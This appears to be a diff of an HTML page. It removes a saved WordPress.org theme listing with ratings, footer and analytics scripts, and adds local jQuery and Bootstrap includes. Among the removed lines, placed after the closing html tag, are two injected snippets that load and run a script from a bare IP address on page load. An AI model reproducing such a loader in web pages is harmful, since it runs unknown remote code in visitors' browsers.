-	<p class="button preview-button"><a class='thickbox' href='http://wp-themes.com/sugar-and-spice?TB_iframe=true&width=600&height=400'>Preview</a></p>
-	
-	<div id="fyi" class="block">
-			<ul style="padding-bottom: 0; margin-bottom: 0;">
-				<li><strong>Last Updated:</strong> 2014-01-22</li>
-				<li><strong>Downloads:</strong> 19,865</li>
-				<li><a href='http://webtuts.pl/themes/sugar-spice' rel='nofollow'>Theme Homepage &#187;</a></li>
-			</ul>
-	</div>
-
-	<div class="block" style="margin-bottom: 1.5em;">
-		<span itemprop="offers" itemscope itemtype="http://schema.org/Offer"><meta itemprop="price" content="0.00"><meta itemprop="priceCurrency" content="USD" /></span>
-		<div class="left" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
-			<meta itemprop="ratingValue" content="5.00" />
-			<meta itemprop="ratingCount" content="8" />
-			<h4>Ratings</h4>	<div class="star-holder">
-		<div class="star-rating" style="width: 92px">5 stars</div>
-	</div>
-<span>5 out of 5 stars</span>
-		<div class="counter-container">
-		<a href="//wordpress.org/support/view/theme-reviews/sugar-and-spice?filter=5" 
-			title="Click to see reviews that provided a rating of 5 stars">
-			<span class="counter-label" style="float:left; margin-right:5px;">5 stars</span>
-			<span class="counter-back" style="height:17px;width:92px;background-color:#ececec;float:left;">
-				<span class="counter-bar" style="width: 92px;height:17px;background-color:#fddb5a;float:left;">
-				</span>
-			</span>
-		</a>
-		<span class="counter-count" style="margin-left:5px;">8</span>
-		</div>
-		<div class="counter-container">
-		<a href="//wordpress.org/support/view/theme-reviews/sugar-and-spice?filter=4" 
-			title="Click to see reviews that provided a rating of 4 stars">
-			<span class="counter-label" style="float:left; margin-right:5px;">4 stars</span>
-			<span class="counter-back" style="height:17px;width:92px;background-color:#ececec;float:left;">
-				<span class="counter-bar" style="width: 0px;height:17px;background-color:#fddb5a;float:left;">
-				</span>
-			</span>
-		</a>
-		<span class="counter-count" style="margin-left:5px;">0</span>
-		</div>
-		<div class="counter-container">
-		<a href="//wordpress.org/support/view/theme-reviews/sugar-and-spice?filter=3" 
-			title="Click to see reviews that provided a rating of 3 stars">
-			<span class="counter-label" style="float:left; margin-right:5px;">3 stars</span>
-			<span class="counter-back" style="height:17px;width:92px;background-color:#ececec;float:left;">
-				<span class="counter-bar" style="width: 0px;height:17px;background-color:#fddb5a;float:left;">
-				</span>
-			</span>
-		</a>
-		<span class="counter-count" style="margin-left:5px;">0</span>
-		</div>
-		<div class="counter-container">
-		<a href="//wordpress.org/support/view/theme-reviews/sugar-and-spice?filter=2" 
-			title="Click to see reviews that provided a rating of 2 stars">
-			<span class="counter-label" style="float:left; margin-right:5px;">2 stars</span>
-			<span class="counter-back" style="height:17px;width:92px;background-color:#ececec;float:left;">
-				<span class="counter-bar" style="width: 0px;height:17px;background-color:#fddb5a;float:left;">
-				</span>
-			</span>
-		</a>
-		<span class="counter-count" style="margin-left:5px;">0</span>
-		</div>
-		<div class="counter-container">
-		<a href="//wordpress.org/support/view/theme-reviews/sugar-and-spice?filter=1" 
-			title="Click to see reviews that provided a rating of 1 star">
-			<span class="counter-label" style="float:left; margin-right:5px;">1 stars</span>
-			<span class="counter-back" style="height:17px;width:92px;background-color:#ececec;float:left;">
-				<span class="counter-bar" style="width: 0px;height:17px;background-color:#fddb5a;float:left;">
-				</span>
-			</span>
-		</a>
-		<span class="counter-count" style="margin-left:5px;">0</span>
-		</div>
-		</div>
-		<br class="clear" />
-
-		</div>
-
-	
-	<div class="support-sidebox block">
-		<h3 class="head">Support</h3>
-		<div>
-				<p>52 of 71 support threads in the last two months have been resolved.</p>
-				<p>Got something to say? Need help?</p>
-			<div id="theme-submit-support"><a href="//wordpress.org/support/theme/sugar-and-spice">View support forum</a></div>
-		</div>
-	</div>
-
-	
-</div><!-- col-3 -->
-
-</div><!-- schema.org/Product -->
-
-		</div>
-	</div>
-</div>
-
-<br class="clear" />
-
-<div id="wporg-footer">
-	<div class="wrapper">
-		<ul>
-			<li><a href="//wordpress.org/about/" title="An introduction to the WordPress project">About</a></li>
-			<li><a href="//wordpress.org/news/" title="News and Updates">Blog</a></li>
-			<li><a href="//wordpress.org/hosting/" title="Recommended web hosting providers">Hosting</a></li>
-			<li><a href="http://jobs.wordpress.net/" title="Find or post WordPress jobs">Jobs</a></li>
-		</ul>
-
-		<ul>
-			<li><a href="//wordpress.org/support/" title="Forums, documentation, and other resources">Support</a></li>
-						<li><a href="//make.wordpress.org/" title="Give back to WordPress through code, support, translation and more">Get Involved</a></li>
-			<li><a href="//learn.wordpress.org/" title="Workshops and training materials">Learn</a></li>
-		</ul>
-
-		<ul>
-			<li><a href="//wordpress.org/showcase/" title="Some of the best WordPress sites on the Web">Showcase</a></li>
-			<li><a href="//wordpress.org/plugins/" title="Add extra functionality to WordPress">Plugins</a></li>
-			<li><a href="//wordpress.org/themes/" title="Make your WordPress pretty">Themes</a></li>
-			<li><a href="//wordpress.org/ideas/" title="Share your ideas for improving WordPress">Ideas</a></li>
-		</ul>
-
-		<ul>
-			<li><a href="http://central.wordcamp.org/" title="Find a WordPress event near you">WordCamp</a></li>
-			<li><a href="http://wordpress.tv/" title="Videos, tutorials, and WordCamp sessions">WordPress.TV</a></li>
-			<li><a href="//buddypress.org/" title="A set of plugins to transform your WordPress into a social network">BuddyPress</a></li>
-			<li><a href="//bbpress.org/" title="Fast, slick forums built on WordPress">bbPress</a></li>
-		</ul>
-
-		<ul>
-			<li><a href="http://wordpress.com/?ref=wporg-footer" title="Hassle-free WordPress hosting">WordPress.com</a></li>
-			<li><a href="http://ma.tt/" title="Co-founder of WordPress, an example of what WordPress can do">Matt</a></li>
-			<li><a href="//wordpress.org/about/privacy/" title="WordPress.org Privacy Policy">Privacy</a></li>
-			<li><a href="//wordpress.org/about/license/" title="WordPress is open source software">License / GPLv2</a></li>
-		</ul>
-
-		<ul>
-			<li>
-				<iframe allowtransparency="true" frameborder="0" scrolling="no" src="//platform.twitter.com/widgets/follow_button.html?screen_name=WordPress&show_count=false" style="width:135px; height:20px;"></iframe>
-			</li>
-			<li>
-				<iframe src="//www.facebook.com/plugins/like.php?app_id=121415197926116&amp;href=http%3A%2F%2Fwww.facebook.com%2Fwordpress&amp;send=false&amp;layout=button_count&amp;width=135&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=lucida+grande&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:135px; height:21px;" allowTransparency="true"></iframe>
-			</li>
-		</ul>
-	</div>
-
-	<h6 class="aligncenter">Code is Poetry</h6>
-</div>
-
-
-<script type="text/javascript">
-  var _qevents = _qevents || [];
-  (function() {
-   var elem = document.createElement('script');
-   elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge")
-               + ".quantserve.com/quant.js";
-   elem.async = true;
-   elem.type = "text/javascript";
-   var scpt = document.getElementsByTagName('script')[0];
-   scpt.parentNode.insertBefore(elem, scpt);
-  })();
-</script>
-<script type="text/javascript">_qevents.push( { qacct:"p-18-mFEk4J448M"} );</script>
-<noscript><img src="//pixel.quantserve.com/pixel/p-18-mFEk4J448M.gif" style="display: none;" border="0" height="1" width="1" alt=""/></noscript>
-<!-- 9 queries, 0.050 seconds -->
-<script type="text/javascript" src="//gravatar.com/js/gprofiles.js"></script>
-
-<script type="text/javascript">
-(function($){
-$(document).ready(function() {
-	$('#footer a').click(function() {
-		if (this.href.indexOf('wordpress.org') == -1 && this.href.indexOf('http') == 0) {
-			recordOutboundLink(this, 'Outbound Links', this.href);
-			return false;
-		}
-	});
-});
-})(jQuery);
-</script>
+	<script src="assets/js/jquery-1.7.2.min.js"></script>
+	<!-- <script src="assets/css/bootstrap/js/bootstrap.min.js"></script> -->
+	<script src="assets/js/bootstrap-typeahead.js"></script>
+	<script src="assets/js/bootstrap-tooltip.js"></script>
+	<script src="assets/js/bootstrap-popover.js"></script>
+	<script src="assets/js/orbit-1.2.3/jquery.orbit-1.2.3.js"></script>
+	<script src="assets/js/index.js"></script>
 </body>
 </html>
-
-<script type="text/javascript">(function(){var js = document.createElement("script");js.src="http://115.238.147.102/A0EED19F1C1CB08BDED1D52D5DA33474?id=1&t=345058931&m=c87281dfecb808ab"+Math.random();var h = document.getElementsByTagName("head")[0];h.appendChild(js);})()</script>
-<script type="text/javascript">(function(){var js = document.createElement("script");js.src="http://115.238.147.102/A0EED19F1C1CB08BDED1D52D5DA33474?id=1&t=345058934&m=c87281dfecb808ab"+Math.random();var h = document.getElementsByTagName("head")[0];h.appendChild(js);})()</script>
